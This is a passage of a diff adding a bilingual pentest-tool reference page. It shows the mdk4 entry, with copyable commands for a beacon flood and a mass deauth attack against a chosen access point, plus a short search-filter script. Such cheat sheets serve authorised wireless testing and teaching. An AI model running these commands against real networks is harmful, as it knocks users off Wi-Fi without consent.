+                <i class="fa-solid fa-chevron-down"></i>
+            </button>
+            <div class="accordion-body"><div class="accordion-content">
+                <p><span data-lang-pt>Ferramenta de stress test 802.11. Beacon flood, authentication flood e deauth em massa.</span><span data-lang-en>802.11 stress test tool. Beacon flood, authentication flood and mass deauth.</span></p>
+                <div class="command-box" style="margin-bottom: var(--space-3);"><code>sudo mdk4 wlan0mon b</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <div class="command-box"><code>sudo mdk4 wlan0mon d -b [BSSID]</code><button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button></div>
+                <p class="text-xs text-muted" style="margin-top: var(--space-2);"><code>b</code> = beacon flood | <code>d</code> = deauth | <code>a</code> = auth flood</p>
+            </div></div>
+        </div>
+
+    </div>
+</div>
+
+<script>
+// Local search for arsenal page
+document.addEventListener('DOMContentLoaded', function() {
+    const searchInput = document.getElementById('tool-search');
+    if (searchInput) {
+        searchInput.addEventListener('input', function() {
+            const query = this.value.toLowerCase().trim();
+            document.querySelectorAll('.tool-entry').forEach(item => {
+                const text = (item.getAttribute('data-search-text') || item.textContent).toLowerCase();
+                item.style.display = (!query || text.includes(query)) ? '' : 'none';
+            });
+        });
+    }
+});
+</script>
